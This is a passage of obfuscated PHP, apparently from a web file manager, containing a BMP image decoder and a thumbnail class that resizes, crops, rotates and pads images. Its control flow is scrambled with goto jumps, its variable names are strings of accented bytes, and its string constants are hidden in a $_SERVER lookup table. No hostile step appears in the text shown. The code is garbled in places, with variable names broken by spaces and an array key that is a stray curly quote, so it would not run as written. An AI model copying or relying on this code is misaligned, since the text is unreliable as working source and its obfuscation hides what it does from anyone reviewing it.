$cëôé‚‡Á = $DÀ°öÀ™ê[$eÆÄùÊ›¾†[75]]; if (in_array($DÀ°öÀ™ê[$eÆÄùÊ›¾†[419]], $c‘¢¡¼«—)) { return !1; } goto eœ“Îï˜ó‡; f«Šº¶Øå‰: if (IO::exist($f—™ÎŒî¢)) { $c‘¢¡¼«—[] = $DÀ°öÀ™ê[$eÆÄùÊ›¾†[419]]; return !1; } $b‰ºªí¶˜ = array($eÆÄùÊ›¾†[727] => $DÀ°öÀ™ê[$eÆÄùÊ›¾†[727]], $eÆÄùÊ›¾†[75] => array($eÆÄùÊ›¾†[735], "{$f—™ÎŒî¢}\x25")); $a¯Ã¼„ç«£ = Model($eÆÄùÊ›¾†[702])->where($b‰ºªí¶˜)->field($eÆÄùÊ›¾†[420])->select(); goto B†ª¤­ø; eœ“Îï˜ó‡: if (!in_array($DÀ°öÀ™ê[$eÆÄùÊ›¾†[727]], $a…†“»’ì)) { return !1; } if (IO::exist($cëôé‚‡Á)) { return !0; } $f—™ÎŒî¢ = get_path_father($cëôé‚‡Á); goto f«Šº¶Øå‰; cõÈæ“ôËª: } private function _fileFilter($a¤á…á¹Ü) { $c¹§ñ‚ñœ =& $_SERVER[“]; if (empty($a¤á…á¹Ü)) { return; } $Bò”ñŠ»Üç = array($c¹§ñ‚ñœ[419] => array($c¹§ñ‚ñœ[7], array_unique($a¤á…á¹Ü))); $aùâİ×ïÄ = Model($c¹§ñ‚ñœ[736])->where($Bò”ñŠ»Üç)->field($c¹§ñ‚ñœ[369])->select(); foreach ($aùâİ×ïÄ as $Eåíñâà¤â) { Model($c¹§ñ‚ñœ[736])->remove($Eåíñâà¤â[$c¹§ñ‚ñœ[369]], !1); } } private function storeIds() { $B³ŠÕ˜Áâó =& $_SERVER[“]; $Föì³ÑÎ— = Model($B³ŠÕ˜Áâó[687])->listData(); $aÏ§Î‘¦¤Â = array(); $C»õéßºÈÁ = $GLOBALS[$B³ŠÕ˜Áâó[6]][$B³ŠÕ˜Áâó[84]][$B³ŠÕ˜Áâó[737]]; foreach ($Föì³ÑÎ— as $e¢šÎğ–„) { $A•ó‡Î¹ = strtolower($e¢šÎğ–„[$B³ŠÕ˜Áâó[90]]); if (!isset($C»õéßºÈÁ[$A•ó‡Î¹])) { continue; } $AŸò…åß¢Ï = $B³ŠÕ˜Áâó[71] . (isset($C»õéßºÈÁ[$A•ó‡Î¹]) ? $C»õéßºÈÁ[$A•ó‡Î¹] : ucfirst($A•ó‡Î¹)); if (!class_exists($AŸò…åß¢Ï)) { continue; } $aÏ§Î‘¦¤Â[] = $e¢šÎğ–„[$B³ŠÕ˜Áâó[367]]; } return $aÏ§Î‘¦¤Â; } } goto EÁñÆ¸Ø¸¾; eÇÈÊ«£¨Á: class ImageGdBMP { public static function load($cÈ«™ŸóÓƒ) { $E±ÑğÍÉ‹ = fopen($cÈ«™ŸóÓƒ, $_SERVER[“][1507]); if ($E±ÑğÍÉ‹ === !1) { return !1; } $b©›ñ³Íä’ = self::loadFromStream($E±ÑğÍÉ‹); fclose($E±ÑğÍÉ‹); return $b©›ñ³Íä’; } public static function loadFromStream($bö•ĞÓ¾öÔ) { $eŠÏè¸¹¢ =& $_SERVER[“]; $D£ì…ÂÔ×– = fread($bö•ĞÓ¾öÔ, 14); if ($D£ì…ÂÔ×– === !1) { return !1; } if ($D£ì…ÂÔ×–[0] != $eŠÏè¸¹¢[1820] || $D£ì…ÂÔ×–[1] != $eŠÏè¸¹¢[1821]) { return !1; } $aÑÒ÷³‘—  = unpack($eŠÏè¸¹¢[1822] . $eŠÏè¸¹¢[1823] . $eŠÏè¸¹¢[1824] . $eŠÏè¸¹¢[1825] . $eŠÏè¸¹¢[1826], $D£ì…ÂÔ×–); return self::loadFromStreamAndFileHeader($bö•ĞÓ¾öÔ, $aÑÒ÷³‘— ); } public static function loadFromStreamAndFileHeader($F‰‡‰İÀ, array $fĞè×‚­Ã) { goto CÆ•¼í­™; f÷ÔÜ¾òÃÕ: if ($AÓæ¥…’‘¤ === !1) { return !1; } list(, $BË¯âÊİê×) = unpack($e…œš·Šº£[1827], $AÓæ¥…’‘¤); if ($BË¯âÊİê× == 12) { goto a¥ÛÖš®‰; Dä±ŠÔñøµ: $bÍ­ìµ¹¨° = 255; goto AİÀ£¾°é¾; CÂƒÍê·Œˆ: $a©©ïÎëï™ = $F¨êã·ĞÃ = $fÙÕÇ÷« = $Cœ¾ç‘½–˜ = 0; $b‡‘…¶ß¾¿ = 16711680; $EË©õòÚÖÃ = 65280; goto Dä±ŠÔñøµ; a¥ÛÖš®‰: $AÓæ¥…’‘¤ = fread($F‰‡‰İÀ, $BË¯âÊİê× - 4); if ($AÓæ¥…’‘¤ === !1) { return !1; } extract(unpack($e…œš·Šº£[1828] . $e…œš·Šº£[1829] . $e…œš·Šº£[1830] . $e…œš·Šº£[1831], $AÓæ¥…’‘¤)); goto CÂƒÍê·Œˆ; AİÀ£¾°é¾: } else { if (124 < $BË¯âÊİê× || $BË¯âÊİê× < 40) { return !1; } else { goto fùŠ‰·¡¼; d¾±”²ÌŒ†: if ($aÕ»…µ¼èï & 2147483648) { $aÕ»…µ¼èï = -(~$aÕ»…µ¼èï & 4294967295) - 1; } if ($CÏÛí´ì•« & 2147483648) { $CÏÛí´ì•« = -(~$CÏÛí´ì•« & 4294967295) - 1; } if ($aŠÊÇ„¥¦£ & 2147483648) { $aŠÊÇ„¥¦£ = -(~$aŠÊÇ„¥¦£ & 4294967295) - 1; } goto FË‚É½ƒ…; eï‹Ü‚ÇÈ: if (($bÔ‘ø›½‘ó == 16 || $bÔ‘ø›½‘ó == 24 || $bÔ‘ø›½‘ó == 32) && $Cœ¾ç‘½–˜ == 0 && $b‡‘…¶ß¾¿ == 0 && $EË©õòÚÖÃ == 0 && $bÍ­ìµ¹¨° == 0) { switch ($bÔ‘ø›½‘ó) { case 16: $b‡‘…¶ß¾¿ = 31744; $EË©õòÚÖÃ = 992; $bÍ­ìµ¹¨° = 31; break; case 24: case 32: $b‡‘…¶ß¾¿ = 16711680; $EË©õòÚÖÃ = 65280; $bÍ­ìµ¹¨° = 255; break; } } goto Cîƒòí¯ŠØ; FË‚É½ƒ…: if ($a¾Ò¾»Ç • & 2147483648) { $a¾Ò¾»Ç • = -(~$a¾Ò¾»Ç • & 4294967295) - 1; } if ($fĞè×‚­Ã[$e…œš·Šº£[522]] != 0) { $b©ĞâšØ±« = $bÔ‘ø›½‘ó == 1 || $bÔ‘ø›½‘ó == 4 || $bÔ‘ø›½‘ó == 8 ? ($a©©ïÎëï™ ? $a©©ïÎëï™ : pow(2, $bÔ‘ø›½‘ó)) << 2 : 0; $f‡‡ÊäçŒ = $aÉÂØÜÛ¶† ? $aÉÂØÜÛ¶† : ($aÕ»…µ¼èï * $bÔ‘ø›½‘ó + 31 >> 3 & ~3) * abs($CÏÛí´ì•«); $a™¸•„¸ó» = $fĞè×‚­Ã[$e…œš·Šº£[522]] - $f‡‡ÊäçŒ - $b©ĞâšØ±« - 14; if ($BË¯âÊİê× < $a™¸•„¸ó» && 40 <= $BË¯âÊİê× && $BË¯âÊİê× <= 124) { $BË¯âÊİê× = $a™¸•„¸ó»; } } if ($BË¯âÊİê× - 40 > 0) { $AÓæ¥…’‘¤ = fread($F‰‡‰İÀ, $BË¯âÊİê× - 40); if ($AÓæ¥…’‘¤ === !1) { return !1; } extract(unpack($e…œš·Šº£[1841] . $e…œš·Šº£[1842] . $e…œš·Šº£[1843] . $e…œš·Šº£[1844], $AÓæ¥…’‘¤ . str_repeat($e…œš·Šº£[1845], 120))); } else { $fÙÕÇ÷« = $b‡‘…¶ß¾¿ = $EË©õòÚÖÃ = $bÍ­ìµ¹¨° = 0; } goto eï‹Ü‚ÇÈ; fùŠ‰·¡¼: $AÓæ¥…’‘¤ = fread($F‰‡‰İÀ, 36); if ($AÓæ¥…’‘¤ === !1) { return !1; } extract(unpack($e…œš·Šº£[1832] . $e…œš·Šº£[1833] . $e…œš·Šº£[1830] . $e…œš·Šº£[1834] . $e…œš·Šº£[1835] . $e…œš·Šº£[1836] . $e…œš·Šº£[1837] . $e…œš·Šº£[1838] . $e…œš·Šº£[1839] . $e…œš·Šº£[1840], $AÓæ¥…’‘¤)); goto d¾±”²ÌŒ†; Cîƒòí¯ŠØ: } } goto c¨Â¨Öª—; c¨Â¨Öª—: if ($aÕ»…µ¼èï == 0 || $CÏÛí´ì•« == 0 || $bœé¤¢ÀçË != 1 || ($fÙÕÇ÷« & $b‡‘…¶ß¾¿) != 0 || ($fÙÕÇ÷« & $EË©õòÚÖÃ) != 0 || ($fÙÕÇ÷« & $bÍ­ìµ¹¨°) != 0 || ($b‡‘…¶ß¾¿ & $EË©õòÚÖÃ) != 0 || ($b‡‘…¶ß¾¿ & $bÍ­ìµ¹¨°) != 0 || ($EË©õòÚÖÃ & $bÍ­ìµ¹¨°) != 0) { return !1; } if ($Cœ¾ç‘½–˜ == 4 || $Cœ¾ç‘½–˜ == 5) { $AÓæ¥…’‘¤ = stream_get_contents($F‰‡‰İÀ, $aÉÂØÜÛ¶†); if ($AÓæ¥…’‘¤ === !1) { return !1; } return imagecreatefromstring($AÓæ¥…’‘¤); } $fÉôª = $aÕ»…µ¼èï * $bÔ‘ø›½‘ó + 31 >> 3 & ~3; goto C«â†‡’­¯; f‘ĞİÓÜÔ: if ($bÔ‘ø›½‘ó == 1 || $bÔ‘ø›½‘ó == 4 || $bÔ‘ø›½‘ó == 8) { goto dƒºÍ•’¼÷; D…¥šÙÄ©Å: $cÃÚŠ¶ä©ã = array(); for ($F˜ï§™î‰¸ = 0; $F˜ï§™î‰¸ < $eÅÀ•Ä¤â; ++$F˜ï§™î‰¸) { $AÓæ¥…’‘¤ = fread($F‰‡‰İÀ, $cˆƒ‘í·Ç); if ($AÓæ¥…’‘¤ === !1) { imagedestroy($A¤ØÆÖÇ“²); return !1; } extract(unpack($e…œš·Šº£[1846], $AÓæ¥…’‘¤ . $e…œš·Šº£[1845])); $cÃÚŠ¶ä©ã[] = imagecolorallocate($A¤ØÆÖÇ“², $dÙŒªµ…ŠŠ, $c”•¯ÓªŒ, $D‚–¯Áœ); } $FôºÁŠŞùƒ = 8 - $bÔ‘ø›½‘ó; goto B­¨ƒæ„é; dƒºÍ•’¼÷: $A¤ØÆÖÇ“² = imagecreate($aÕ»…µ¼èï, $Fê›ãÑù); $cˆƒ‘í·Ç = $BË¯âÊİê× == 12 ? 3 : 4; $eÅÀ•Ä¤â = $a©©ïÎëï™ ? $a©©ïÎëï™ : pow(2, $bÔ‘ø›½‘ó); goto D…¥šÙÄ©Å; B­¨ƒæ„é: $B’šøÚø× = (1 << $bÔ‘ø›½‘ó) - 1 << $FôºÁŠŞùƒ; if ($Cœ¾ç‘½–˜ == 1 || $Cœ¾ç‘½–˜ == 2) { $d‹ŒØÓÇ‘ = 0; $f‘ÚÅÍ­ô = $bÔ‘ø›½‘ó >> 2 & 1; for (;;) { if ($d‹ŒØÓÇ‘ < -1 || $d‹ŒØÓÇ‘ > $aÕ»…µ¼èï || $aÃğ””…Ú < -1 || $aÃğ””…Ú > $CÏÛí´ì•«) { imagedestroy($A¤ØÆÖÇ“²); return !1; } $AÓæ¥…’‘¤ = fread($F‰‡‰İÀ, 1); if ($AÓæ¥…’‘¤ === !1) { imagedestroy($A¤ØÆÖÇ“²); return !1; } switch ($AÓæ¥…’‘¤) { case $e…œš·Šº£[1845]: $AÓæ¥…’‘¤ = fread($F‰‡‰İÀ, 1); if ($AÓæ¥…’‘¤ === !1) { imagedestroy($A¤ØÆÖÇ“²); return !1; } switch ($AÓæ¥…’‘¤) { case $e…œš·Šº£[1845]: $aÃğ””…Ú += $CÚ°£®Üõ; $d‹ŒØÓÇ‘ = 0; break; case $e…œš·Šº£[1847]: $aÃğ””…Ú = 0; $d‹ŒØÓÇ‘ = 0; break 3; case $e…œš·Šº£[1848]: $AÓæ¥…’‘¤ = fread($F‰‡‰İÀ, 2); if ($AÓæ¥…’‘¤ === !1) { imagedestroy($A¤ØÆÖÇ“²); return !1; } list(, $câê—éì²±, $B‚‘îù‚ƒÖ) = unpack($e…œš·Šº£[1849], $AÓæ¥…’‘¤); $d‹ŒØÓÇ‘ += $câê—éì²±; $aÃğ””…Ú += $B‚‘îù‚ƒÖ * $CÚ°£®Üõ; break; default: list(, $e˜°È¿¼‡») = unpack($e…œš·Šº£[1850], $AÓæ¥…’‘¤); $D§ÂÛ–îŒá = ($e˜°È¿¼‡» >> $f‘ÚÅÍ­ô) + ($e˜°È¿¼‡» & $f‘ÚÅÍ­ô); $AÓæ¥…’‘¤ = fread($F‰‡‰İÀ, $D§ÂÛ–îŒá + 1 & ~1); if ($AÓæ¥…’‘¤ === !1) { imagedestroy($A¤ØÆÖÇ“²); return !1; } for ($F˜ï§™î‰¸ = 0, $dÑ†ˆºõî = 0; $F˜ï§™î‰¸ < $e˜°È¿¼‡»; ++$F˜ï§™î‰¸, ++$d‹ŒØÓÇ‘, $dÑ†ˆºõî += $bÔ‘ø›½‘ó) { list(, $eù†“›‘ƒ) = unpack($e…œš·Šº£[1850], $AÓæ¥…’‘¤[$dÑ†ˆºõî >> 3]); $D‚–¯Áœ = $dÑ†ˆºõî & 7; imagesetpixel($A¤ØÆÖÇ“², $d‹ŒØÓÇ‘, $aÃğ””…Ú, $cÃÚŠ¶ä©ã[($eù†“›‘ƒ & $B’šøÚø× >> $D‚–¯Áœ) >> $FôºÁŠŞùƒ - $D‚–¯Áœ]); } break; } break; default: $f†©ç¬½Ù¸ = fread($F‰‡‰İÀ, 1); if ($f†©ç¬½Ù¸ === !1) { imagedestroy($A¤ØÆÖÇ“²); return !1; } list(, $b‡ï…¾‘, $eù†“›‘ƒ) = unpack($e…œš·Šº£[1849], $AÓæ¥…’‘¤ . $f†©ç¬½Ù¸); for ($F˜ï§™î‰¸ = 0, $dÑ†ˆºõî = 0; $F˜ï§™î‰¸ < $b‡ï…¾‘; ++$F˜ï§™î‰¸, ++$d‹ŒØÓÇ‘, $dÑ†ˆºõî += $bÔ‘ø›½‘ó) { $D‚–¯Áœ = $dÑ†ˆºõî & 7; imagesetpixel($A¤ØÆÖÇ“², $d‹ŒØÓÇ‘, $aÃğ””…Ú, $cÃÚŠ¶ä©ã[($eù†“›‘ƒ & $B’šøÚø× >> $D‚–¯Áœ) >> $FôºÁŠŞùƒ - $D‚–¯Áœ]); } break; } } } else { for ($eœºß²òá = 0; $eœºß²òá < $Fê›ãÑù; ++$eœºß²òá, $aÃğ””…Ú += $CÚ°£®Üõ) { $AÓæ¥…’‘¤ = fread($F‰‡‰İÀ, $fÉôª); if ($AÓæ¥…’‘¤ === !1) { imagedestroy($A¤ØÆÖÇ“²); return !1; } $dÑ†ˆºõî = 0; for ($d‹ŒØÓÇ‘ = 0; $d‹ŒØÓÇ‘ < $aÕ»…µ¼èï; ++$d‹ŒØÓÇ‘, $dÑ†ˆºõî += $bÔ‘ø›½‘ó) { list(, $eù†“›‘ƒ) = unpack($e…œš·Šº£[1850], $AÓæ¥…’‘¤[$dÑ†ˆºõî >> 3]); $D‚–¯Áœ = $dÑ†ˆºõî & 7; imagesetpixel($A¤ØÆÖÇ“², $d‹ŒØÓÇ‘, $aÃğ””…Ú, $cÃÚŠ¶ä©ã[($eù†“›‘ƒ & $B’šøÚø× >> $D‚–¯Áœ) >> $FôºÁŠŞùƒ - $D‚–¯Áœ]); } } } goto BÉçÃÙ”…×; BÉçÃÙ”…×: } else { goto dØ½‹Ü°ÍÕ; d¬‘¯õŒå: $C“Ìø‘‚ìŠ = $bÔ‘ø›½‘ó >> 3; $dùš‹å§ÔŸ = $fÙÕÇ÷« ? 127 : 0; $bŠÍ™„—ğƒ = $fÙÕÇ÷« ? 1 / $fÙÕÇ÷« : 1; goto F»…Û½‰à; Fß·ƒÊ°Ğ: for ($eœºß²òá = 0; $eœºß²òá < $Fê›ãÑù; ++$eœºß²òá, $aÃğ””…Ú += $CÚ°£®Üõ) { $AÓæ¥…’‘¤ = fread($F‰‡‰İÀ, $fÉôª); if ($AÓæ¥…’‘¤ === !1) { imagedestroy($A¤ØÆÖÇ“²); return !1; } $dÑ†ˆºõî = 0; for ($d‹ŒØÓÇ‘ = 0; $d‹ŒØÓÇ‘ < $aÕ»…µ¼èï; ++$d‹ŒØÓÇ‘, $dÑ†ˆºõî += $C“Ìø‘‚ìŠ) { list(, $eù†“›‘ƒ) = unpack($e…œš·Šº£[1827], substr($AÓæ¥…’‘¤, $dÑ†ˆºõî, $C“Ìø‘‚ìŠ) . $e…œš·Šº£[1851]); $E«ˆõÌ­ƒ˜ = $eù†“›‘ƒ & $fÙÕÇ÷«; $f´ñ†ñÚ§“ = $eù†“›‘ƒ & $b‡‘…¶ß¾¿; $F° ÙÇ¡Úƒ = $eù†“›‘ƒ & $EË©õòÚÖÃ; $Eó‡õÒˆ = $eù†“›‘ƒ & $bÍ­ìµ¹¨°; $cÌ°˜¡ò’ = $dùš‹å§ÔŸ - (($E«ˆõÌ­ƒ˜ << 7) - $E«ˆõÌ­ƒ˜) * $bŠÍ™„—ğƒ; $dÙŒªµ…ŠŠ = (($f´ñ†ñÚ§“ << 8) - $f´ñ†ñÚ§“) * $EÊóÙ£‘«™; $c”•¯ÓªŒ = (($F° ÙÇ¡Úƒ << 8) - $F° ÙÇ¡Úƒ) * $F³ˆ´Ğ©öİ; $D‚–¯Áœ = (($Eó‡õÒˆ << 8) - $Eó‡õÒˆ) * $DãïöÁ›‰£; imagesetpixel($A¤ØÆÖÇ“², $d‹ŒØÓÇ‘, $aÃğ””…Ú, $cÌ°˜¡ò’ << 24 | $dÙŒªµ…ŠŠ << 16 | $c”•¯ÓªŒ << 8 | $D‚–¯Áœ); } } imagealphablending($A¤ØÆÖÇ“², !0); goto Bã¦Ìôíù‹; F»…Û½‰à: $EÊóÙ£‘«™ = $b‡‘…¶ß¾¿ ? 1 / $b‡‘…¶ß¾¿ : 1; $F³ˆ´Ğ©öİ = $EË©õòÚÖÃ ? 1 / $EË©õòÚÖÃ : 1; $DãïöÁ›‰£ = $bÍ­ìµ¹¨° ? 1 / $bÍ­ìµ¹¨° : 1; goto Fß·ƒÊ°Ğ; dØ½‹Ü°ÍÕ: $A¤ØÆÖÇ“² = imagecreatetruecolor($aÕ»…µ¼èï, $Fê›ãÑù); imagealphablending($A¤ØÆÖÇ“², !1); if ($fÙÕÇ÷«) { imagesavealpha($A¤ØÆÖÇ“², !0); } goto d¬‘¯õŒå; Bã¦Ìôíù‹: } return $A¤ØÆÖÇ“²; goto F¨«±Åœ‚×; C«â†‡’­¯: $Fê›ãÑù = abs($CÏÛí´ì•«); $aÃğ””…Ú = $CÏÛí´ì•« > 0 ? $Fê›ãÑù - 1 : 0; $CÚ°£®Üõ = $CÏÛí´ì•« > 0 ? -1 : 1; goto f‘ĞİÓÜÔ; CÆ•¼í­™: $e…œš·Šº£ =& $_SERVER[“]; if ($fĞè×‚­Ã[$e…œš·Šº£[388]] != 19778) { return !1; } $AÓæ¥…’‘¤ = fread($F‰‡‰İÀ, 4); goto f÷ÔÜ¾òÃÕ; F¨«±Åœ‚×: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($bØ”ëŸğâ, $d„ê…‡Í¼) { goto e¹³‡È˜…ê; a¿Ş±¸š‡: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto a¡ÈêÄ‘Û¶; e¹³‡È˜…ê: $this->srcFile = $bØ”ëŸğâ; $this->echoType = $d„ê…‡Í¼; $this->im = self::image($bØ”ëŸğâ); goto BÅ§Õù°àİ; BÅ§Õù°àİ: if (!$this->im) { return !1; } $CåğŠ‰çğ = $_SERVER[“][33]; $this->imgData = GetImageSize($bØ”ëŸğâ, $CåğŠ‰çğ); goto a¿Ş±¸š‡; a¡ÈêÄ‘Û¶: } public static function image($d²ğ¼½¬á‹) { $BÖÔè©¡Ë´ =& $_SERVER[“]; $E…‡‚˜ˆ… = $BÖÔè©¡Ë´[33]; $c°ó‚²ÌÆ˜ = GetImageSize($d²ğ¼½¬á‹, $E…‡‚˜ˆ…); $EòøÍ‘ã¹‘ = !1; switch ($c°ó‚²ÌÆ˜[2]) { case IMAGETYPE_GIF: if (!function_exists($BÖÔè©¡Ë´[1852])) { break; } $EòøÍ‘ã¹‘ = imagecreatefromgif($d²ğ¼½¬á‹); break; case IMAGETYPE_JPEG: if (!function_exists($BÖÔè©¡Ë´[1853])) { break; } $EòøÍ‘ã¹‘ = imagecreatefromjpeg($d²ğ¼½¬á‹); break; case IMAGETYPE_PNG: if (!function_exists($BÖÔè©¡Ë´[1854])) { break; } $EòøÍ‘ã¹‘ = @imagecreatefrompng($d²ğ¼½¬á‹); imagesavealpha($EòøÍ‘ã¹‘, !0); break; case IMAGETYPE_XBM: $EòøÍ‘ã¹‘ = imagecreatefromxbm($d²ğ¼½¬á‹); break; case IMAGETYPE_WBMP: $EòøÍ‘ã¹‘ = imagecreatefromwbmp($d²ğ¼½¬á‹); break; case IMAGETYPE_BMP: $EòøÍ‘ã¹‘ = imagecreatefrombmp($d²ğ¼½¬á‹); break; default: break; } return $EòøÍ‘ã¹‘; } public static function imageSize($fÇ–ÈŠĞ¡Ï) { $eĞ¡‚»Ö‡Î =& $_SERVER[“]; $Aœ–ó«À = GetImageSize($fÇ–ÈŠĞ¡Ï); if (!$Aœ–ó«À) { return !1; } return array($eĞ¡‚»Ö‡Î[1855] => $Aœ–ó«À[0], $eĞ¡‚»Ö‡Î[1856] => $Aœ–ó«À[1]); } function distortion($D¨¥ĞŒÓó×, $C Â½ÑØ—¸, $b”æö¼‹Ü˜) { $dä½èï¼»Ú = $this->creatImage($this->im, $C Â½ÑØ—¸, $b”æö¼‹Ü˜, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($dä½èï¼»Ú, $D¨¥ĞŒÓó×); } function prorate($F‡¹Œõ¨Ôî, $D°ˆ¯òóÏä, $E­íŒ¸³Ôè) { $f“Œè¾áœÈ = $D°ˆ¯òóÏä / $E­íŒ¸³Ôè; $d–Şì¢ÌÚ™ = $this->srcW / $this->srcH; if ($f“Œè¾áœÈ <= $d–Şì¢ÌÚ™) { $F¯ÕôäÓÔ = $D°ˆ¯òóÏä; $CÎ©‘˜İËí = $F¯ÕôäÓÔ * ($this->srcH / $this->srcW); } else { $CÎ©‘˜İËí = $E­íŒ¸³Ôè; $F¯ÕôäÓÔ = $CÎ©‘˜İËí * ($this->srcW / $this->srcH); } if ($this->srcW > $D°ˆ¯òóÏä || $this->srcH > $E­íŒ¸³Ôè) { $F¦·–Ïã²Ì = $this->creatImage($this->im, $F¯ÕôäÓÔ, $CÎ©‘˜İËí, 0, 0, 0, 0, $this->srcW, $this->srcH); } else { $F¦·–Ïã²Ì = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); } $F¦·–Ïã²Ì = $this->autoRotate($F¦·–Ïã²Ì); return $this->echoImage($F¦·–Ïã²Ì, $F‡¹Œõ¨Ôî); } private function autoRotate($DØÇÏÉªù«) { goto fÊ‘£Ù›ßé; E–Ëî¶öÆ°: if ($c”ßñÕÍ½À[$e†ÓÛŞ™Î[1858]] == 8) { $aº„¢îË· = 270; } if ($c”ßñÕÍ½À[$e†ÓÛŞ™Î[1858]] == 3) { $aº„¢îË· = 180; } return $this->rotateDegree($DØÇÏÉªù«, $aº„¢îË·); goto bÙÔÂ´İŸ; fÊ‘£Ù›ßé: $e†ÓÛŞ™Î =& $_SERVER[“]; if (!$DØÇÏÉªù« || !function_exists($e†ÓÛŞ™Î[1857])) { return $DØÇÏÉªù«; } $c”ßñÕÍ½À = exif_read_data($this->srcFile); goto DëäÆÈ›‡; DëäÆÈ›‡: if (!$c”ßñÕÍ½À || !isset($c”ßñÕÍ½À[$e†ÓÛŞ™Î[1858]]) || $c”ßñÕÍ½À[$e†ÓÛŞ™Î[1858]] == 1) { return $DØÇÏÉªù«; } $aº„¢îË· = 0; if ($c”ßñÕÍ½À[$e†ÓÛŞ™Î[1858]] == 6) { $aº„¢îË· = 90; } goto E–Ëî¶öÆ°; bÙÔÂ´İŸ: } private function rotateDegree($b½œ’šñƒ£, $FĞ§ÇÒèó ) { if (!$b½œ’šñƒ£ || $FĞ§ÇÒèó  % 360 === 0 || !function_exists($_SERVER[“][1859])) { return $b½œ’šñƒ£; } $bÒÅ‚á‘¬’ = imageRotate($b½œ’šñƒ£, 360 - $FĞ§ÇÒèó , 0); imageDestroy($b½œ’šñƒ£); return $bÒÅ‚á‘¬’ ? $bÒÅ‚á‘¬’ : $b½œ’šñƒ£; } function cut($dÏçåî–¢Ğ, $bŸÊœ“¬ÓË, $BÄ˜©ğğ©Í) { goto dë¥§ì†–³; CÒÔ˜¥øŒ÷: return $this->echoImage($bí›òŞÍØ¹, $dÏçåî–¢Ğ); goto E³À¾‰œÆÂ; DŒÅ†¥±Œµ: $aö¬¶–·“Ù = $this->creatImage($this->im, $c¸ÇİåÇ¼, $dÁº²»ß”ë, 0, 0, 0, 0, $this->srcW, $this->srcH); $bí›òŞÍØ¹ = $this->creatImage($aö¬¶–·“Ù, $bŸÊœ“¬ÓË, $BÄ˜©ğğ©Í, 0, 0, ($c¸ÇİåÇ¼ - $bŸÊœ“¬ÓË) / 2, ($dÁº²»ß”ë - $BÄ˜©ğğ©Í) / 2, $bŸÊœ“¬ÓË, $BÄ˜©ğğ©Í); imageDestroy($aö¬¶–·“Ù); goto CÒÔ˜¥øŒ÷; dë¥§ì†–³: $bàÆöÒŞÑ£ = $bŸÊœ“¬ÓË / $BÄ˜©ğğ©Í; $Cò–ªÍÀ‚Ü = $this->srcW / $this->srcH; if ($bàÆöÒŞÑ£ <= $Cò–ªÍÀ‚Ü) { $dÁº²»ß”ë = $BÄ˜©ğğ©Í; $c¸ÇİåÇ¼ = $dÁº²»ß”ë * ($this->srcW / $this->srcH); } else { $c¸ÇİåÇ¼ = $bŸÊœ“¬ÓË; $dÁº²»ß”ë = $c¸ÇİåÇ¼ * ($this->srcH / $this->srcW); } goto DŒÅ†¥±Œµ; E³À¾‰œÆÂ: } function backFill($cñ½´³„Ã, $d¦ Ó‘‹», $AÚİÔëøÇò, $EŸÌÀ‚®™ = false, $fé¼­Ë£å = 255, $B¿¯àè‹Úï = 255, $då†ˆÚŠ = 255) { goto f—œ¬î„„; B†ç¤Ñ­Ë°: if (function_exists($_SERVER[“][1860])) { @($A³—ÕƒŒ·» = imageCreateTrueColor($d¦ Ó‘‹», $AÚİÔëøÇò)); if (!$A³—ÕƒŒ·») { $A³—ÕƒŒ·» = imageCreate($d¦ Ó‘‹», $AÚİÔëøÇò); } } else { $A³—ÕƒŒ·» = imageCreate($d¦ Ó‘‹», $AÚİÔëøÇò); } $dÄæª¾éÁÔ = ($AÚİÔëøÇò - $dÇÇ©‚®·Û) / 2; $eºÑŞ…šêÇ = imagecolorallocate($A³—ÕƒŒ·», $fé¼­Ë£å, $B¿¯àè‹Úï, $då†ˆÚŠ); goto AÅ†Õ÷ë°‚; f—œ¬î„„: $c§´Õ¿­†¦ = $d¦ Ó‘‹» / $AÚİÔëøÇò; $d‰â¦±­÷½ = $this->srcW / $this->srcH; if ($c§´Õ¿­†¦ <= $d‰â¦±­÷½) { $c“‡š·‚ß = $d¦ Ó‘‹»; $dÇÇ©‚®·Û = $c“‡š·‚ß * ($this->srcH / $this->srcW); } else { $dÇÇ©‚®·Û = $AÚİÔëøÇò; $c“‡š·‚ß = $dÇÇ©‚®·Û * ($this->srcW / $this->srcH); } goto B†ç¤Ñ­Ë°; AÅ†Õ÷ë°‚: if ($EŸÌÀ‚®™) { $eºÑŞ…šêÇ = imageColorTransparent($A³—ÕƒŒ·», $eºÑŞ…šêÇ); $dÄæª¾éÁÔ = $AÚİÔëøÇò - $dÇÇ©‚®·Û; } imageFilledRectangle($A³—ÕƒŒ·», 0, 0, $d¦ Ó‘‹», $AÚİÔëøÇò, $eºÑŞ…šêÇ); if ($this->srcW > $d¦ Ó‘‹» || $this->srcH > $AÚİÔëøÇò) { $B‘œ²°®¨² = $this->creatImage($this->im, $c“‡š·‚ß, $dÇÇ©‚®·Û, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($c“‡š·‚ß < $d¦ Ó‘‹») { imageCopy($A³—ÕƒŒ·», $B‘œ²°®¨², ($d¦ Ó‘‹» - $c“‡š·‚ß) / 2, 0, 0, 0, $c“‡š·‚ß, $dÇÇ©‚®·Û); } else { if ($dÇÇ©‚®·Û < $AÚİÔëøÇò) { imageCopy($A³—ÕƒŒ·», $B‘œ²°®¨², 0, $dÄæª¾éÁÔ, 0, 0, $c“‡š·‚ß, $dÇÇ©‚®·Û); } else { imageCopy($A³—ÕƒŒ·», $B‘œ²°®¨², 0, 0, 0, 0, $c“‡š·‚ß, $dÇÇ©‚®·Û); } } } else { imageCopyMerge($A³—ÕƒŒ·», $this->im, ($d¦ Ó‘‹» - $c“‡š·‚ß) / 2, $dÄæª¾éÁÔ, 0, 0, $c“‡š·‚ß, $dÇÇ©‚®·Û, 100); } goto b¡İß±‚ï»; b¡İß±‚ï»: return $this->echoImage($A³—ÕƒŒ·», $cñ½´³„Ã); goto B·é‰ÑŸÈÂ; B·é‰ÑŸÈÂ: } function creatImage($F£Â¸‰ï›‘, $b÷Úšƒ†Ñ„, $eÁîÂàî…Å, $CÕ±§À…Á, $aø‘„¸‰ ¿, $AáÃÔ…˜›‘, $A²ÚÊŠ¨ÖÃ, $CÍö¸ã‰İ×, $B†×Ú¸¿¨¬) { if (function_exists($_SERVER[“][1860])) { @($cÉĞ¸ÓÓñœ = 